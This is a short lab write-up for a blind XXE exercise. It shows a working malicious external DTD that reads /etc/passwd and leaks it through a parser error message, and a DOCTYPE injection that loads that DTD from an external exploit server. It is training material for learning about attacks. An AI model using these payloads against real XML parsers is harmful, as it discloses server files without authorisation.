Title: Exploiting blind XXE to retrieve data via error messages
Level: Practitioner
Desc:  This lab has a "Check stock" feature that parses XML input but does not display the result.
To solve the lab, use an external DTD to trigger an error message that displays the contents of the /etc/passwd file.
The lab contains a link to an exploit server on a different domain where you can host your malicious DTD

First try with parametrized entity: 
![image](https://github.com/user-attachments/assets/f1782e0a-dfc9-4da7-8bd3-d718f1556976)
error: "XML parser exited with error: org.xml.sax.SAXParseException; systemId: file:///etc/passwd; lineNumber: 1; columnNumber: 1; The markup declarations contained or pointed to by the document type declaration must be well-formed."

Second try with external DTD:

![image](https://github.com/user-attachments/assets/abe795b6-7621-4208-9647-f3a5db639996)

payload: 
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
```

calling: 
```
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://exploit-0afa009a04562499803120a6014a0044.exploit-server.net/exploit"> %xxe; ]>
```
